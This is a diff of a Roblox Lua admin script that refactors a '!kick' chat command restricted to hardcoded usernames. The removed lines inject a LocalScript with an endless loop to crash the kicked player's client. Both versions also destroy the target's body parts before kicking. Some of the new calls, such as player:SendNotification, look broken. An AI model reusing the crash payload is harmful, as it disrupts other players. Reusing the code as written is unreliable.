@@ -14,15 +14,13 @@ local Player = game:GetService("Players").LocalPlayer
 local Mouse = Player:GetMouse()
 local StarterGui = game:GetService("StarterGui")
 
+-- Lista de usuarios con permisos de administrador
 local sigmas = {
     "pedrood2", 
     "iidino122",
     "Milaneso202_xd",
     "iAmLegitTrust_p",
 }
-
-local alpha = "!users"
-local connectedPlayers = {} -- Tabla para evitar conexiones duplicadas
 
 -- Verificar si un usuario es admin
 local function admins(name)
@@ -44,56 +42,73 @@ local function findPlayerByName(partialName)
     end
     return nil
 end
-if message and type(message) == "string" and message:sub(1, 5):lower() == "!kick" and player.Name:lower() == "pedrood2" then
-    local partialName = message:sub(7):lower()
-    local targetPlayer = findPlayerByName(partialName)
-    
-    if targetPlayer then
-        local targetCharacter = targetPlayer.Character
-        if targetCharacter then
-            -- Destruir partes del personaje del jugador objetivo
-            local torso = targetCharacter:FindFirstChild("Torso")
-            if torso then torso:Destroy() end
-            
-            wait(1)
-            game.Workspace.FallenPartsDestroyHeight = math.huge -- Cambia el nivel de destrucción a infinito
-            
-            -- Teletransportar al jugador objetivo
-            local humanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
-            if humanoidRootPart then
-                humanoidRootPart.CFrame = CFrame.new(-989889989898989, -989879898998988, -98999898989899898)
-            end
 
-            -- Destruir más partes del personaje objetivo
-            local humanoid = targetCharacter:FindFirstChild("Humanoid")
-            if humanoid then humanoid:Destroy() end
+-- Función principal para manejar comandos
+local function handleMessage(player, message)
+    -- Validar entrada
+    if not message or type(message) ~= "string" then return end
+
+    -- Verificar si es un comando de kick
+    if message:sub(1, 5):lower() == "!kick" then
+        -- Verificar si el jugador tiene permisos
+        if admins(player.Name) then
+            local partialName = message:sub(7):lower()
+            local targetPlayer = findPlayerByName(partialName)
             
-            for _, partName in ipairs({"Head", "Right Leg", "Left Leg", "Right Arm"}) do
-                local part = targetCharacter:FindFirstChild(partName)
-                if part then part:Destroy() end
-            end
-            
-            -- Expulsar al jugador objetivo
-            targetPlayer:Kick("You were kicked by Dev/Admin.")
-            
-            -- Intentar crashear al objetivo
-            local targetLocalScript = targetPlayer:FindFirstChild("PlayerGui") or targetPlayer:FindFirstChild("Backpack")
-            if targetLocalScript then
-                local scriptClone = Instance.new("LocalScript", targetLocalScript)
-                scriptClone.Source = [[
-                    game.Players.LocalPlayer:Kick("You were kicked by Dev/Admin.")
-                    while true do end
-                ]]
+            if targetPlayer then
+                local targetCharacter = targetPlayer.Character
+                if targetCharacter then
+                    -- Destruir partes del personaje del jugador objetivo
+                    local torso = targetCharacter:FindFirstChild("Torso")
+                    if torso then torso:Destroy() end
+                    
+                    wait(1)
+                    game.Workspace.FallenPartsDestroyHeight = math.huge -- Cambia el nivel de destrucción a infinito
+                    
+                    -- Teletransportar al jugador objetivo
+                    local humanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
+                    if humanoidRootPart then
+                        humanoidRootPart.CFrame = CFrame.new(-9999, -9999, -9999)
+                    end
+
+                    -- Destruir más partes del personaje objetivo
+                    local humanoid = targetCharacter:FindFirstChild("Humanoid")
+                    if humanoid then humanoid:Destroy() end
+                    
+                    for _, partName in ipairs({"Head", "Right Leg", "Left Leg", "Right Arm"}) do
+                        local part = targetCharacter:FindFirstChild(partName)
+                        if part then part:Destroy() end
+                    end
+                    
+                    -- Expulsar al jugador objetivo
+                    targetPlayer:Kick("You were kicked by Dev/Admin.")
+                else
+                    player:SendNotification({
+                        Title = "Error",
+                        Text = "El jugador no tiene un personaje válido.",
+                    })
+                end
+            else
+                player:SendNotification({
+                    Title = "Error",
+                    Text = "Jugador no encontrado: " .. partialName,
+                })
             end
         else
-            notifyPlayer(player, "Error", "El jugador no tiene un personaje válido en el juego.")
+            player:SendNotification({
+                Title = "Permiso denegado",
+                Text = "No tienes permisos para usar este comando.",
+            })
         end
-    else
-        notifyPlayer(player, "Error", "Jugador no encontrado: " .. partialName)
     end
-elseif message and type(message) == "string" and message:sub(1, 5):lower() == "!kick" then
-    notifyPlayer(player, "Permiso denegado", "No tienes permisos para usar este comando.")
 end
+
+-- Conectar al evento de mensajes (si es un evento de chat o comandos)
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        handleMessage(player, message)
+    end)
+end)
 
 
 -- Mostrar notificación
